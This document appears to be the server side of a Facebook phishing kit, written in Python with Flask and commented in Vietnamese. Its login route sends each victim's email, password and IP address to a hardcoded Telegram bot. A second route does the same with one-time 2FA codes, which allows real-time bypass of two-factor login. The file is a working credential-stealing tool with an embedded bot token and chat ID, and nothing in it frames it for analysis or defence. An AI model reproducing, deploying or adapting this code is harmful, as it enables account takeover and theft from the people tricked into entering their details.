from flask import Flask, request, send_from_directory
from flask_cors import CORS
import requests
import time

app = Flask(__name__)
CORS(app)

# ===== TOKEN VÀ CHAT ID CỦA BẠN =====
BOT_TOKEN = '8645746215:AAFei4n6HewA8McPDbMnHPWaBtUIYS5B3QA'
CHAT_ID = '8405296727'
# =====================================

def send_telegram(msg):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, json={'chat_id': CHAT_ID, 'text': msg})
    except Exception as e:
        print("Lỗi gửi Telegram:", e)

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json()
    email = data.get('email', '')
    password = data.get('password', '')
    ip = request.remote_addr
    
    msg = f"""🔐 ĐĂNG NHẬP FB 🔐
📧 Email: {email}
🔑 Mật khẩu: {password}
🌐 IP: {ip}
⏰ Thời gian: {time.strftime('%H:%M:%S %d/%m/%Y')}"""
    
    send_telegram(msg)
    return {'status': 'ok'}

@app.route('/api/verify', methods=['POST'])
def verify():
    data = request.get_json()
    email = data.get('email', '')
    password = data.get('password', '')
    otp = data.get('otp', '')
    
    msg = f"""🔐 MÃ 2FA 🔐
📧 Email: {email}
🔑 Mật khẩu: {password}
🔢 Mã OTP: {otp}
⏰ Thời gian: {time.strftime('%H:%M:%S %d/%m/%Y')}"""
    
    send_telegram(msg)
    return {'status': 'ok'}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)